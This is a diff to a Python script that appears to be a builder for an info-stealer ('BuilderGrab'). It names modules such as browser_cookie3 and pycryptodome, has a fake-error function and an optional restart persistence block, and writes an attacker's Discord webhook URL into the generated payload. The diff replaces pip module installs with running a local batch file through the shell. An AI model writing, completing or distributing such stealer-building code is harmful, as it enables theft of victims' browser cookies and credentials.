@@ -1478,7 +1478,6 @@ def Fake_Error():
 '''
 
 
-
 if not name_file.strip():
     random_number = random.randint(1, 1000)
     name_file = f'BuilderGrab_{random_number}'
@@ -1501,18 +1500,12 @@ path_destination = "./1-File-Create"
 
 print(f"{color.RED}\n[!] | Installing missing modules:{color.RESET}")
 
-subprocess.check_call(['pip', 'install', '--upgrade', 'discord.py'])
+file_bat = os.path.abspath("./Settings/Setup-Builder.bat")
+subprocess.call(file_bat, shell=True)
 
-ModuleInstall("screeninfo")
-ModuleInstall("psutil")
-ModuleInstall("GPUtil")
-ModuleInstall("sqlite3")
-ModuleInstall("requests")
-ModuleInstall("pycryptodome")
-ModuleInstall("discord")
-ModuleInstall("pywin32")
-ModuleInstall("Pillow")
-ModuleInstall("browser_cookie3")
+time.sleep(3)
+
+print(file_bat)
 
 with open(file_text, 'w', encoding='utf-8') as file:
  file.write(f"webhook_url = \"{webhook}\"")
@@ -1543,7 +1536,6 @@ with open(file_text, 'w', encoding='utf-8') as file:
 
  if add_restart in ['y', 'Y', 'Yes', 'yes', 'YES']:
     file.write(Restart)
-
 
 
 with open(file_text, 'r', encoding='utf-8') as file_txt:
